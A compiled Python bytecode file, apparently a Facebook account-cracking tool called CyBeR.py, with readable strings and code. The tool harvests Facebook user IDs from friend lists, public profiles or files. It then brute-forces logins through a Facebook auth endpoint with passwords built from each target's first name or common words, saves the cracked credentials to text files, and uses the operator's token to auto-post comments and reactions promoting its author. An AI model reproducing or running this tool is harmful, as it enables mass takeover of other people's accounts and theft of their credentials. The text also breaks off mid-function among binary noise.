�
���_c           @   s�  d  d l  Z  d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l	 Z	 d  d l
 Z
 d  d l Z d  d l Z d  d l
 Z
 d  d l m Z d Z d Z d Z d Z d Z d Z d	 Z e e e e e e e g Z e j e � Z e j e � Z y d  d l Z Wn e k
 rKe  j d
 � n Xy d  d l Z Wn+ e k
 r�e  j d � e  j d � n Xd  d
 l m Z d  d l m  Z  d  d l m Z e! e � e j" d � e j  �  Z# e# j$ e% � e# j& e j' j( �  d d �d d f g e# _) e  j d � e% Z* d �  Z+ e	 j, d e+ � Z- e- j. �  e j/ d � e0 Z* d �  Z1 d �  Z2 d �  Z3 d �  Z4 d Z5 d Z6 d Z7 d  Z8 x� e8 d  k r'e9 d! � Z: e: e6 k re9 d" � Z; e; e7 k r�d# e: GHe j/ d$ � d% Z8 n d& GHe  j d' � n d( GHe  j d' � q�Wd) �  Z< d* Z= g  Z> g  Z? g  a@ g  aA g  ZB g  ZC d+ �  ZD d, �  ZE d- �  ZF d. �  ZG d/ �  ZH d0 �  ZI d1 �  ZJ d2 �  ZK d3 �  ZL d4 �  ZM d5 �  ZN d6 �  ZO d7 �  ZP d8 �  ZQ d9 �  ZR d: �  ZS d; �  ZT d< �  ZU d= �  ZV d> �  ZW d? �  ZX d@ �  ZY dA �  ZZ dB �  Z[ dC �  Z\ dD �  Z] e^ dE k rbeK �  eD �  n  dF GHdG �  Z\ dH �  Z] e^ dE k r�eK �  eD �  n  d S(I   i����N(   t
   ThreadPools   [1;97ms   [1;91ms   [1;92ms   [1;93ms   [1;94ms   [1;95ms   [1;96ms   pip2 install mechanizes   pip2 install requestss   python2 CyBeR.py(   t   ConnectionError(   t   Browser(   t   datetimet   utf8t   max_timei   s
   User-AgentsR   Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16t   clearc          C   s  x� t  j d d d d g � D]� }  t r, Pn  t j j d |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  � t j j �  t j d � q Wd  S(   Ns   [1;96m|s   [1;92m/s   [1;95m-s   [1;91m\s   
[1;93mLoading g�������?(	   t	   itertoolst   cyclet   donet   syst   stdoutt   writet   flusht   timet   sleep(   t   c(    (    s   CyBeR.pyt   animate)   s    "�
t   targeti   c           C   s   d GHt  j j �  d  S(   Ns   [1;97m{[1;91m![1;97m} Keluar(   t   osR
   t   exit(    (    (    s   CyBeR.pyt   keluar7   s    c         C   sS   d } d } x: |  D]2 } | d | t  j d t | � d � | 7} q Wt | � S(   Nt   mhkbpcPt    t   !i    i   (   t   randomt   randintt   lent   cetak(   t   xt   wt   dt   i(    (    s   CyBeR.pyt   acak<   s
    
0c         C   s~   d } xA | D]9 } | j  | � } |  j d | d t d | � � }  q
 W|  d 7}  |  j d d � }  t j j |  d � d  S(   NR   s   !%ss   %s;i   R   s   !0s   
(   t   indext   replacet   strR
   R   R   (   R   R   R    t   j(    (    s   CyBeR.pyR   D   s    
(
c         C   sC   x< |  d D]0 } t  j j | � t  j j �  t j d � q Wd  S(   Ns   
g���Q��?(   R
   R   R   R
   R   R   (   t   zt   e(    (    s   CyBeR.pyt   jalanN   s    
s  
[1;93m____▄▀▀▀▄▄▄▄▄▄▄▀▀▀▄_
[1;94m───█▒▒░░░░░░░░░▒▒█───
[1;95m────█░░█░░░░░█░░█────
[1;96m─▄▄──█░░░▀█▀░░░█──▄▄─
[1;97m█░░█─▀▄░░░░░░░▄▀─█░░█
[1;97m█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█
[1;96m█----╦─╦╔╗╦─╔╗╔╗╔╦╗╔╗----█
[1;95m█----║║║╠─║─║─║║║║║╠─----█
[1;94m█----╚╩╝╚╝╚╝╚╝╚╝╩─╩╚╝----█
[1;93m█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█
[1;91m┈╭━━━━━━━━━━━╮┈
[1;95m┈┃╭━━━╮┊╭━━━╮┃┈
[1;94m╭┫┃┈▇┈┃┊┃┈▇┈┃┣╮
[1;96m┃┃╰━━━╯┊╰━━━╯┃┃
[1;93m╰┫╭━╮╰━━━╯╭━╮┣╯
[1;92m┈┃┃┣┳┳┳┳┳┳┳┫┃┃┈
[1;94m┈┃┃╰┻┻┻┻┻┻┻╯┃┃┈
[1;93m┈╰━━━━━━━━━━━╯┈               
[1;91m•───────────────────────────────────────────•
[1;91m*╔═════════════════❖••افغانستان ღ•❖══════════════╗*
[1;91m ╔══╗───╔╦╗╔╗╔═╦╗
[1;95m ╚╗╔╝╔═╗║╔╝╠╣║║║║
[1;94m ─║║─║╩╣║╚╗║║║║║║
[1;96m ─╚╝─╚═╝╚╩╝╚╝╚╩═╝
[1;91m*╚═════════════════❖•ღڿڰۣ✿•°•✿ڿڰۣღ•❖══════════════╝* 
[1;91m•───────────────────────────────────────────•
[1;97m•-----------------[1;37mTEKIN MUTLU⚡AFG[1;97m-----------------•
 [1;97m•▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅
[1;41m[1;37m[⚡🔥[1;37mAuthor : CAPTAN TEKIN🔥⚡[1;37m][1;0m
[1;41m[1;37m[⚡🔥[1;37mFacebook : www.facebook.com/TIKIN MULU🔥⚡[1;37m][1;0m
[1;41m[1;37m[⚡🔥[1;37mTELGRAM: FACEBOOK LEARN🔥⚡[1;37m][1;0m
[1;41m[1;37m[⚡🔥 [1;37mFrom:AFGHANISTAN 🔥⚡[1;37m][1;0m
[1;41m[1;37m[⚡🔥[1;37mTELGRAM ID : @CaPTaN_TeKiN🔥⚡[1;37m][1;0m
[1;97m•▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅
[1;97m•-----------------[1;37mTEKIN MUTLU⚡AFG[1;97m-----------------•
t   CYBERt   ERRORt   trues8   [1;91m[+] [1;91m [1;91mTool Username [1;91m: [1;97ms8   [1;91m[+] [1;91m [1;91mTool Password [1;91m: [1;97ms   Login successfully Bro i   t   falses#   [1;97mTEKIN Password MUTLU Admins9   xdg-open https://api.whatsapp.com/send?phone=447441412648s#   [1;97mTEKIN Username MUTLU Adminc           C   s   t  j d � t �  d  S(   NR   (   R   t   systemt   login(    (    (    s   CyBeR.pyt   lisensi�   s    
i    c           C   s>   t  j d � t GHd d GHd GHd GHd GHd d GHt �  d  S(   NR   i2   s
   [1;94m─s.   [1;97m{[1;92m01[1;97m} LOGIN LEWAT TOKEN !!s.   [1;97m{[1;92m02[1;97m} AMBIL TOKEN DISINI:)s    [1;97m{[1;91m00[1;97m} Keluar(   R   R-   t   logot   pilih_masuk(    (    (    s   CyBeR.pyt   masuk�   s    
		c          C   s�   t  d � }  |  d k r' d GHt �  nr |  d k s? |  d k rI t �  nP |  d k sa |  d k rk t �  n. |  d k s� |  d	 k r� t �  n d GHt �  d  S(
   NsD   [1;90m  ✬︻╦̵̵͇̿̿̿̿╤═͇̿̿̿̿╤═[91m:[1;92m R   s)   [1;97m[[1;91m![1;97m] CHOICES OPTION !t   1t   01t   2t   02t   0t   00(   t	   raw_inputR1   t   tokenzt   ambil_tokenR   (   t   msuk(    (    s   CyBeR.pyR1   �   s    



c          C   s�  y t  d � j �  }  Wn t k
 r5 t d � }  n Xi |  d 6}  t j t j d d t �d |  �j	 } d t
 | � k rod t
 | � k r� t  d d � � } | j |  d � Wd  QXnF y< t j t j t
 | d	 � j d
 d d �d
 � d |  �Wn n Xy] t
 t j t j d � d |  �j	 d	 � j d
 d d �d
 } t j t j | � d |  �Wn n X|  d Sd GHt j d � t j d � d  S(   Nt   cookiess   [00mCookies : [1;96mt   cookies   /met   verifyt   mbasic_logout_buttons	   Hallo SobR   s   html.parsert   at   strings   Bahasa Indonesiat   hrefs   /xzcoder.xzcodert   Ikutis   [00mCookies [91mInvalid[00mi   s   python fb.py(   t   opent   readt   FileNotFoundErrort   inputt   sest   gett   mbasict   formatt   Falset   contentR$   R   t   requestst   parsert   findR   R   R   R-   (   t   cekt   ismit   ft   ikuti(    (    s   CyBeR.pyR>   �   s.    

'<= 
c          C   s�   t  j d � t GHd d GHt d � }  yh t j d |  � } t j | j � } t	 d d � } | j
 |  � | j �  d GHt  j d	 � t �  Wn* t
 k
 r� d
 GHt j d � t �  n Xd  S(   NR   i2   s
   [1;94m─s/   [1;97m{[1;95m?[1;97m} Token [1;91m:[1;92m s+   https://graph.facebook.com/me?access_token=s	   login.txtR   s0   [1;97m{[1;92m✓[1;97m}[1;92m Login Berhasils=   xdg-open https://youtube.com/channel/UCYuvXKQaQm08L4015KNBPwws-   [1;97m{[1;91m![1;97m} [1;91mToken salah !g333333�?(   R   R-   R0   R9   RO   RJ   t   jsont   loadst   textRE   R   t   closet	   bot_koment   KeyErrorR   R   R2   (   t   tokett   otwRA   t   zedd(    (    s   CyBeR.pyR:   �   s"    
	




c           C   sJ   t  j d � t GHd d GHt d � t  j d � t j d � t �  d  S(   NR   i2   s
   [1;94m─s8           [1;92mAnda Akan Di Arahkan Ke Group Facebook...sC   xdg-open https://www.facebook.com/groups/457889812280289/?ref=sharei   (   R   R-   R0   R(   R   R   R2   (    (    (    s   CyBeR.pyR;   �   s    
	


c           C   s|   t  j d � t GHd d GHt d � t d � t d � t d � t  j d � t d	 � t  j d
 � t d � t �  d  S(   NR   i2   s
   [1;94m─s1   [1;92mDilarang Menggunakan Akun Facebook Lama...s/   [1;92mWajib Menggunakan Akun Facebook Baru ...s3   [1;92mJika Ingin Menggunakan Akun Facebook Lama...s3   [1;92mWajib Menggunakan Aplikasi Yg Di Sediakan...s   cd ... && npm installs   [1;96mMulai...s   cd ... && npm starts   
[ Kembali ](   R   R-   R0   R(   R9   R2   (    (    (    s   CyBeR.pyt
   ambil_link�   s    
	







c          C   s  y t  d d � j �  }  Wn# t k
 r> d GHt j d � n Xd } d } d } d } d } d	 } d
 } t j d | d |  � t j d
 | d | d |  � t j d
 | d | d |  � t j d
 | d | d |  � t j d
 | d | d |  � t �  d  S(   Ns	   login.txtt   rs   [1;97m[!] Token invalids   rm -rf login.txtt   100000099406184s   MANTAP BANG SC NYA😘t   ANGRYt   3874924625854146s   GW PAKE SC LO 😁t   LOVEs7   https://graph.facebook.com/me/friends?method=post&uids=s   &access_token=s   https://graph.facebook.com/s   /comments/?message=s   /reactions?type=(   RE   RF   t   IOErrorR   R-   RO   t   postt   menu(   R\   t   unat   komt   reacRf   t   post2t   kom2t   reac2(    (    s   CyBeR.pyRZ   �   s$    
!!!!c          C   s�  t  j d � y t d d � j �  }  Wn7 t k
 r_ d GHt  j d � t  j d � t �  n Xy= t j d |  � } t j	 | j
 � } | d } | d } Wnz t k
 r� t  j d � d	 GHt  j d � t j
 d
 � t �  t j
 d
 � t �  n# t j j k
 rd GHt �  n Xt  j d � t GHd d
 GHd | GHd | GHd d
 GHd t d t d GHd t d t d GHd t d t d GHd t d t d GHd t d t d GHd t d GHd d
 GHt �  d  S(   NR   s	   login.txtR`   s   {!} Token Invalid !s   rm -rf login.txts,   https://graph.facebook.com/me/?access_token=t   namet   ids   [1;96m[!] [1;91mToken invalidi   s   {!} Tidak ada koneksii2   s
   [1;94m─s;   [1;97m{[1;96m•[1;97m}[1;95m NAMA[1;90m    =>[1;92m s;   [1;97m{[1;96m•[1;97m}[1;95m USER ID[1;90m =>[1;92m s   [1;97m{s
   01[1;97m}s    Crack ID Dari Teman/Publiks
   02[1;97m}s#    Crack ID Dari Postingan Grup/Temans
   03[1;97m}s    Crack ID Dari Total Followerss
   04[1;97m}s    Yahoo clones
   05[1;97m}s    Perbarui Scripts   [1;97m{[1;91m00[1;97m}s    Keluar(   R   R-   RE   RF   Re   R2   RO   RJ   RV   RW   RX   R[   R   R   t
   exceptionsR   R   R0   t   warnit   warnat   pilih(   R\   R]   RA   t   namaRo   (    (    s   CyBeR.pyRg     sL    











				
	c          C   sI  t  d � }  |  d k r' d GHt �  n|  d k s? |  d k rI t �  n� |  d k sa |  d k rk t �  n� |  d k s� |  d	 k r� t �  n� |  d
 k s� |  d k r� t �  n� |  d k s� |  d
 k r� t �  nt |  d k s� |  d k r� t �  nR |  d k s|  d k r9t j	 d � t
 d � t j	 d � t �  n d GHt �  d  S(   Ns%   [1;92m︻デ═一▸ [91m:[1;92m R   s2   [1;97m{[1;91m![1;97m}[1;97m Isi Yg Benar Tod !R3   R4   R5   R6   t   3t   03t   4t   04t   5t   05t   6t   06R7   R8   R   s   Menghapus tokens   rm -rf login.txt(   R9   Rs   t   crack_temant   crack_likest   crack_followt   user_idt   yahoot   perbaruiR   R-   R(   R   (   t   unikers(    (    s   CyBeR.pyRs   =  s.    










c           C   s�   t  j d � t GHd d GHd t d t d GHd t d t d GHd t d	 t d
 GHd t d t d GHd
 t d GHd d GHt �  d  S(   NR   i2   s
   [1;94m─s   [1;97m{s
   01[1;97m}s    Crack ID Indonesias
   02[1;97m}s    Crack ID Bangladeshs
   03[1;97m}s
    Crack ID Usas
   04[1;97m}s    Crack ID Pakistans   [1;97m{[1;91m00[1;97m}s    Kembali(   R   R-   R0   Rr   Rq   t   pilih_teman(    (    (    s   CyBeR.pyR}   X  s    
	
	c          C   s  t  d t d � }  |  d k r/ d GHt �  n� |  d k sG |  d k rQ t �  n� |  d k si |  d k rs t �  n� |  d k s� |  d	 k r� t �  nr |  d
 k s� |  d k r� t �  nP |  d k s� |  d
 k r� |  �  n. |  d k s� |  d k r� t �  n d GHt �  d  S(   NR   s   ︻デ═一▸ [91m:[1;92m s2   [1;97m{[1;91m![1;97m}[1;97m Isi Yg Benar Tod !R3   R4   R5   R6   Ru   Rv   Rw   Rx   Ry   Rz   R7   R8   (   R9   Rr   R�   t
   crack_indot   crack_banglat	   crack_usat   crack_pakisRg   (   t   univ(    (    s   CyBeR.pyR�   e  s$    






c           C   s�   t  j d � y t d d � j �  a Wn7 t k
 r_ d GHt  j d � t j d � t �  n Xt  j d � t	 GHd d GHd	 GHd
 GHd GHd GHd d GHt
 �  d  S(
   NR   s	   login.txtR`   s   [1;96m[!] [1;91mToken invalids   rm -rf login.txti   i2   s
   [1;94m─s1   [1;97m{[1;93m01[1;97m} Crack Dari Daftar Temans1   [1;97m{[1;93m02[1;97m} Crack Dari Publik/Temans)   [1;97m{[1;93m03[1;97m} Crack Dari Files!   [1;97m{[1;91m00[1;97m} Kembali(   R   R-   RE   RF   R\   Re   R   R   R   R0   t
   pilih_indo(    (    (    s   CyBeR.pyR�   {  s"    




		c          C   s�  t  d � }  |  d k r' d GHt �  n�|  d k s? |  d k r� t j d � t GHd d GHd	 GHd d GHt j d
 t � } t j	 | j
 � } xQ| d D] } t j | d � q� Wn+|  d
 k s� |  d k r�t j d � t GHd d GHd	 GHd d GHt  d � } y> t j d | d t � } t j	 | j
 � } d | d GHWnI t
 k
 rjd GHt  d � t �  n# t j j k
 r�d GHt �  n Xt j d | d t � } t j	 | j
 � } x$| d D] } t j | d � q�Wn� |  d k s�|  d k r�t j d � t GHyZ d d GHd	 GHd d GHt  d � } x0 t | d � j �  D] }	 t j |	 j �  � qIWWq�t
 k
 r�d GHt  d � q�t k
 r�d GHt  d � t �  q�Xn. |  d k s�|  d  k r�t �  n d! GHt �  d" t t t � � GHd# GHd$ d% d& g }
 x0 |
 D]( } d' | Gt j j �  t j d( � qWd) GHd* GHd+ �  } t d, � }
 |
 j | t � d- GHd. GHd/ t t t  � � d0 t t t! � � GHd1 GHd d GHt  d2 � t j d3 � d  S(4   Ns%   [1;93m︻デ═一▸ [91m:[1;92m R   s.   [1;97m{[1;91m![1;97m}[1;97m Isi Yg Benar !R3   R4   R   i2   s
   [1;94m─sE                [1;93m●●● [1;97mCRACK INDONESIA [1;93m●●●s3   https://graph.facebook.com/me/friends?access_token=t   dataRo   R5   R6   sB   [1;97m{[1;93m●[1;97m} [1;93mID Publik/Teman [1;91m:[1;92m s   https://graph.facebook.com/s   ?access_token=s7   [1;97m{[1;93m●[1;97m}[1;93m Name [1;91m:[1;92m Rn   s4   [1;97m{[1;91m![1;97m} ID publik/teman tidak ada !s!   
[1;93m{[1;97m<Kembali>[1;93m}s,   [1;97m{[1;91m![1;97m} Tidak ada koneksi !s   /friends?access_token=Ru   Rv   s<   [1;97m{[1;93m●[1;97m} [1;93mName File[1;91m :[1;92m R`   s*   [1;97m{[1;91m![1;97m} File tidak ada ! s!   
[1;92m[ [1;97mKembali [1;92m]s)   [1;97m{[1;91m![1;97m} File tidak ada !R7   R8   s.   [1;97m[[1;91m![1;97m][1;97m Isi Yg Benar !s;   [1;97m{[1;93m●[1;97m} [1;93mTotal ID [1;91m:[1;92m s3   [1;97m{[1;93m●[1;97m} [1;93mStop Tekan CTRL+Zs   .   s   ..  s   ... s2   
[1;97m{[1;93m●[1;97m} [1;93mCrack Berjalan i   sL   
[1;97m{[1;93m●[1;97m} [1;93mGunakan Mode Pesawat Jika Tidak Ada Hasils�   [1;94m──────────────────────────────────────────────────c         S   s�
  |  } yV t  j j d j t j �  j d t t | � � � � � t  j j	 �  t
 j d � Wn t k
 ro n XyI
t
 j d | d t � } t j | j � } | d j �  d } t j d | d	 | d
 � } t j | � } d | k rdd GHd
 | d GHd | GHd | GHt d d � } | j d | d d | d | d � | j �  t j | � nT	d | d k r�d GHd | d GHd | GHd | GHt d d � } | j d | d d | d | d � | j �  t j | � n�| d j �  d }	 t j d | d	 |	 d
 � } t j | � } d | k r�d GHd
 | d GHd | GHd |	 GHt d d � } | j d | d d | d |	 d � | j �  t j | � n
d | d k r4d GHd | d GHd | GHd |	 GHt d d � } | j d | d d | d |	 d � | j �  t j | � n�| d j �  d  }
 t j d | d	 |
 d
 � } t j | � } d | k r�d GHd
 | d GHd | GHd |
 GHt d d � } | j d | d d | d |
 d � | j �  t j | � n�d | d k r~d GHd | d GHd | GHd |
 GHt d d � } | j d | d d | d |
 d � | j �  t j | � n:d! } t j d | d	 | d
 � } t j | � } d | k r4d GHd
 | d GHd | GHd | GHt d d � } | j d | d d | d | d � | j �  t j | � n�d | d k r�d GHd | d GHd | GHd | GHt d d � } | j d | d d | d | d � | j �  t j | � n�d" } t j d | d	 | d
 � } t j | � } d | k rpd GHd
 | d GHd | GHd | GHt d d � } | j d | d d | d | d � | j �  t j | � nHd | d k r�d GHd | d GHd | GHd | GHt d d � } | j d | d d | d | d � | j �  t j | � n�d# }
 t j d | d	 |
 d
 � } t j | � } d | k r�d GHd
 | d GHd | GHd |
 GHt d d � } | j d | d d | d |
 d � | j �  t j | � nd | d k r2d GHd | d GHd | GHd |
 GHt d d � } | j d | d d | d |
 d � | j �  t j | � n�d$ } t j d | d	 | d
 � } t j | � } d | k r�d GHd
 | d GHd | GHd | GHt d d � } | j d | d d | d | d � | j �  t j | � n�d | d k rn	d GHd | d GHd | GHd | GHt d d � } | j d | d d | d | d � | j �  t j | � nJ| d% j �  d } t j d | d	 | d
 � } t j | � } d | k r2
d GHd
 | d GHd | GHd | GHt d d � } | j d | d d | d | d � | j �  t j | � n� d | d k r�
d GHd | d GHd | GHd | GHt d d � } | j d | d d | d | d � | j �  t j | � n  Wn n Xd  S(&   Ns   
{}s3   [1;96m%H[1;91m:[1;93m%M[1;91m:[1;92m%S [1;97mR	   s   https://graph.facebook.com/s   /?access_token=t
   first_namet   123s�   https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=s   &locale=en_US&password=sH   &sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6t   access_tokens*   
[1;97m{[1;92m×[1;97m} [1;92mBERHASILs4   [1;97m{[1;92m×[1;97m} Name  [1;91m    > [1;92mRn   s4   [1;97m{[1;92m×[1;97m} User  [1;91m    > [1;92ms4   [1;97m{[1;92m×[1;97m} Password  [1;91m> [1;92ms
   done/indo.txtRA   s    
{×} BERHASIL 
{×} Name     > s   
{×} User     > s   
{×} Password > s   
s   www.facebook.comt	   error_msgs*   
[1;97m{[1;93m×[1;97m} [1;93mCEKPOINTs4   [1;97m{[1;93m×[1;97m} Nama  [1;91m    > [1;93ms4   [1;97m{[1;93m×[1;97m} User  [1;91m    > [1;93ms4   [1;97m{[1;93m×[1;97m} Password  [1;91m> [1;93ms    
{×} TEKIN CP
{×} Name     > t   1234s4   [1;97m{[1;93m×[1;97m} Name  [1;91m    > [1;93mt   12345t   sayangt   bangsatt   anjingt   kontolt	   last_name(   R
   R   R   RL   R   t   nowt   strftimeR$   R   R
   R   t   mkdirt   OSErrorRO   RJ   R\   RV   RW   RX   t   lowert   urllibt   urlopent   loadRE   RY   t   okst   appendt   cekpoint(   t   argt   zowet   anR%   t   bos1R�   t   kot   okeRR   t   bos2t   bos3t   bos4t   bos5t   bos6t   bos7t   bos8(    (    s   CyBeR.pyt   main�  sh   8 


		)

		)

		)

		)

		)

		)

		)

		)

		)

		)

		)

		)

		)

		)

		)

		)
i   s�   
[1;94m──────────────────────────────────────────────────s-   [1;97m{[1;93m●[1;97m} [1;93mSelesai ...sS   [1;97m{[1;93m●[1;97m} [1;93mTotal [1;92mOK[1;97m/[1;93mCP [1;97m: [1;92ms   [1;97m/[1;93msi   [1;97m{[1;93m●[1;97m} [1;92mOK[1;97m/[1;93mCP [1;93mfile tersimpan [1;91m: [1;92mdone/indo.txts    [1;97m{<[1;93mKembali[1;97m>}s   python2 CyBeR.py("   R9   R�   R   R-   R0   RO   RJ   R\   RV   RW   RX   Ro   R�   R[   R�   Rp   R   R   RE   t	   readlinest   stripRe   Rg   R$   R   R
   R   R
   R   R   R    t   mapR�   R�   (   t   teakR`   R&   t   st   idtt   pokt   spR    t   idlistt   linet   titikt   oR�   t   p(    (    s   CyBeR.pyR�   �  s�    

		
		



		





 
 	�)	
c           C   s�   t  j d � y t d d � j �  a Wn7 t k
 r_ d GHt  j d � t j d � t �  n Xt  j d � t	 GHd d GHd	 GHd
 GHd GHd GHd d GHt
 �  d  S(
   NR   s	   login.txtR`   s&   [1;97m{[1;91m![1;97m} Token invalids   rm -rf login.txti   i2   s
   [1;94m─s1   [1;97m{[1;96m01[1;97m} Crack Dari Daftar Temans1   [1;97m{[1;96m02[1;97m} Crack Dari Publik/Temans)   [1;97m{[1;96m03[1;97m} Crack Dari Files!   [1;97m{[1;91m00[1;97m} Kembali(   R   R-   RE   RF   R\   Re   R   R   R   R0   t   pilih_bangla(    (    (    s   CyBeR.pyR�   �  s"    




		c          C   s�  t  d � }  |  d k r' d GHt �  n�|  d k s? |  d k r� t j d � t GHd d GHd	 GHd d GHt j d
 t � } t j	 | j
 � } xQ| d D] } t j | d � q� Wn+|  d
 k s� |  d k r�t j d � t GHd d GHd	 GHd d GHt  d � } y> t j d | d t � } t j	 | j
 � } d | d GHWnI t
 k
 rjd GHt  d � t �  n# t j j k
 r�d GHt �  n Xt j d | d t � } t j	 | j
 � } x$| d D] } t j | d � q�Wn� |  d k s�|  d k r�t j d � t GHyZ d d GHd	 GHd d GHt  d � } x0 t | d � j �  D] }	 t j |	 j �  � qIWWq�t
 k
 r�d GHt  d � q�t k
 r�d GHt  d � t �  q�Xn. |  d k s�|  d  k r�t �  n d GHt �  d! t t t � � GHd" GHd# d$ d% g }
 x0 |
 D]( } d& | Gt j j �  t j d' � qWd( GHd) GHd* �  } t d+ � }
 |
 j | t � d, GHd- GHd. t t t  � � d/ t t t! � � GHd0 GHd d GHt  d1 � t j d2 � d  S(3   Ns%   [1;96m︻デ═一▸ [91m:[1;92m R   s'   [1;97m{[1;91m![1;97m} Isi Yg Benar !R3   R4   R   i2   s
   [1;94m─sF                [1;96m●●● [1;97mCRACK BANGLADESH [1;96m●●●s3   https://graph.facebook.com/me/friends?access_token=R�   Ro   R5   R6   sB   [1;97m{[1;96m●[1;97m}[1;96m ID Publik/Teman [1;91m:[1;92m s   https://graph.facebook.com/s   ?access_token=s7   [1;97m{[1;96m●[1;97m}[1;96m Name [1;91m:[1;92m Rn   s4   [1;97m{[1;91m![1;97m} ID publik/teman tidak ada !s!   
[1;96m{[1;97m<Kembali>[1;96m}s   {!} Tidak ada koneksi !s   /friends?access_token=Ru   Rv   s<   [1;97m{[1;96m●[1;97m}[1;96m Name File [1;91m:[1;92m R`   s*   [1;97m{[1;91m![1;97m} File tidak ada ! s!   
[1;92m[ [1;97mKembali [1;92m]s)   [1;97m{[1;91m![1;97m} File tidak ada !R7   R8   s;   [1;97m{[1;96m●[1;97m}[1;96m Total ID [1;91m:[1;92m s3   [1;97m{[1;96m●[1;97m}[1;96m Stop Tekan CTRL+Zs   .   s   ..  s   ... s2   
[1;97m{[1;96m●[1;97m}[1;96m Crack Berjalan i   sL   
[1;97m{[1;96m●[1;97m} [1;96mGunakan Mode Pesawat Jika Tidak Ada Hasils�   [1;94m──────────────────────────────────────────────────c         S   s�
  t  j j d j t j �  j d � � � t  j j �  |  } y t j	 d � Wn t
 k
 r_ n Xye
t j d | d t
 � } t j | j � } | d j �  d } t j d | d	 | d
 � } t j | � } d | k rTd GHd
 | d GHd | GHd | GHt d d � } | j d | d d | d | d � | j �  t j | � np	d | d k r�d GHd | d GHd | GHd | GHt d d � } | j d | d d | d | d � | j �  t j | � n�| d j �  d }	 t j d | d	 |	 d
 � } t j | � } d | k r�d GHd
 | d GHd | GHd |	 GHt d d � } | j d | d d | d |	 d � | j �  t j | � n&d | d k r$d GHd | d GHd | GHd |	 GHt d d � } | j d | d d | d |	 d � | j �  t j | � n�| d j �  d }
 t j d | d	 |
 d
 � } t j | � } d | k r�d GHd
 | d GHd | GHd |
 GHt d d � } | j d | d d | d |
 d � | j �  t j | � n�d | d k rnd GHd | d GHd | GHd |
 GHt d d � } | j d | d d | d |
 d � | j �  t j | � nVd  } t j d | d	 | d
 � } t j | � } d | k r$d GHd
 | d GHd | GHd | GHt d d � } | j d | d d | d | d � | j �  t j | � n�d | d k r�d GHd | d GHd | GHd | GHt d d � } | j d | d d | d | d � | j �  t j | � nd! } t j d | d	 | d
 � } t j | � } d | k r`d GHd
 | d GHd | GHd | GHt d d � } | j d | d d | d | d � | j �  t j | � ndd | d k r�d GHd | d GHd | GHd | GHt d d � } | j d | d d | d | d � | j �  t j | � n�| d j �  d" }
 t j d | d	 |
 d
 � } t j | � } d | k r�d GHd
 | d GHd | GHd |
 GHt d d � } | j d | d d | d |
 d � | j �  t j | � nd | d k r0d GHd | d GHd | GHd |
 GHt d d � } | j d | d d | d |
 d � | j �  t j | � n�| d# j �  d } t j d | d	 | d
 � } t j | � } d | k r�d GHd
 | d GHd | GHd | GHt d d � } | j d | d d | d | d � | j �  t j | � n�d | d k rz	d GHd | d GHd | GHd | GHt d d � } | j d | d d | d | d � | j �  t j | � nJ| d# j �  d } t j d | d	 | d
 � } t j | � } d | k r>
d GHd
 | d GHd | GHd | GHt d d � } | j d | d d | d | d � | j �  t j | � n� d | d k r�
d GHd | d GHd | GHd | GHt d d � } | j d | d d | d | d � | j �  t j | � n  Wn n Xd  S($   Ns   
{}s+   [1;96m%H[1;91m:[1;93m%M[1;91m:[1;92m%SR	   s   https://graph.facebook.com/s   /?access_token=R�   R�   s�   https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=s   &locale=en_US&password=sH   &sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6R�   s*   
[1;97m{[1;92m×[1;97m} [1;92mBERHASILs4   [1;97m{[1;92m×[1;97m} Name  [1;91m    > [1;92mRn   s4   [1;97m{[1;92m×[1;97m} User  [1;91m    > [1;92ms4   [1;97m{[1;92m×[1;97m} Password  [1;91m> [1;92ms   done/bangla.txtRA   s    
{×} BERHASIL 
{×} Name     > s   
{×} User     > s   
{×} Password > s   
s   www.facebook.comR�   s*   
[1;97m{[1;96m×[1;97m} [1;96mCEKPOINTs4   [1;97m{[1;96m×[1;97m} Name  [1;91m    > [1;96ms4   [1;97m{[1;96m×[1;97m} User  [1;91m    > [1;96ms4   [1;97m{[1;96m×[1;97m} Password  [1;91m> [1;96ms    
{×} CEKPOINT 
{×} Name     > R�   R�   t   786786t
   bangladesht   786R�   (   R
   R   R   RL   R   R�   R�   R
   R   R�   R�   RO   RJ   R\   RV   RW   RX   R�   R�   R�   R�   RE   RY   R�   R�   R�   (   R�   R�   R�   R%   R�   R�   R�   R�   RR   R�   R�   R�   R�   R�   R�   R�   (    (    s   CyBeR.pyR�      sh   ( 


		)

		)

		)

		)

		)

		)

		)

		)

		)

		)

		)

		)

		)

		)

		)

		)
i   s�   
[1;94m──────────────────────────────────────────────────s-   [1;97m{[1;96m●[1;97m} [1;96mSelesai ...sS   [1;97m{[1;96m●[1;97m} [1;96mTotal [1;92mOK[1;97m/[1;96mCP [1;97m: [1;92ms   [1;97m/[1;93msk   [1;97m{[1;96m●[1;97m} [1;92mOK[1;97m/[1;96mCP [1;96mfile tersimpan [1;91m: [1;92mdone/bangla.txts    [1;97m{<[1;96mKembali[1;97m>}s   python2 CyBeR.py("   R9   R�   R   R-   R0   RO   RJ   R\   RV   RW   RX   Ro   R�   R[   R�   Rp   R   R   RE   R�   R�   Re   Rg   R$   R   R
   R   R
   R   R   R    R�   R�   R�   (   R�   R`   R&   R�   t   idbR�   R�   R    R�   R�   R�   R�   R�   R�   (    (    s   CyBeR.pyR�   �  s�    

		
		



		





 
 	�)	
c           C   s�   t  j d � y t d d � j �  a Wn7 t k
 r_ d GHt  j d � t j d � t �  n Xt  j d � t	 GHd d GHd	 GHd
 GHd GHd GHd d GHt
 �  d  S(
